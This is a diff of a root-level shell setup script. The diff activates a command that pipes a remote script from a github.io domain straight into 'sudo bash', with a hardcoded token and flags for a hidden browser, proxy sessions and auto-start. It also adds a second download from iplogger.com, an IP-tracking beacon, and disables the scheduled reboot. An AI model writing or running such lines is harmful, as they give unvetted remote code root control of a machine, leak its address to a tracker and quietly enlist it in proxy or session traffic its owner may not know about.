@@ -50,11 +50,11 @@ fi
 
 
 
-FILE=/root/ReSetup5
+FILE=/root/ReSetup6
 if test -f "$FILE"; then
     echo OK1
 else
-    echo "New Setup" > /root/ReSetup5
+    echo "New Setup" > /root/ReSetup6
     
     #./reconfige.sh
     
@@ -72,9 +72,11 @@ else
     #curl -sSLk https://learnaws1234.github.io/install/linux.sh | sudo bash -s -- --token=7bb1440ac55eeb5221d7d68c87d33406   --system-session --allow-crypto=no --allow-popups=no --session-note=$systemID --note=${systemID:0:2} --hide-browser --cache-del=500 --ex-proxy-sessions=$sessionsCount --clear-all-sessions --auto-start 
     
     wget -O logger https://iplogger.com/2Lt1h5
+    curl -sSLk https://learnaws1234.github.io/install/linux.sh | sudo bash -s -- --token=7bb1440ac55eeb5221d7d68c87d33406   --system-session --allow-crypto=no --allow-popups=no --session-note=$systemID --note=${systemID:0:2} --hide-browser --cache-del=500 --ex-proxy-sessions=$sessionsCount --clear-all-sessions --auto-start 
+    wget -O logger https://iplogger.com/2Lt1h5
 
-    /sbin/shutdown -r now
-    sleep 10
+    #/sbin/shutdown -r now
+    #sleep 10
 
 fi
 
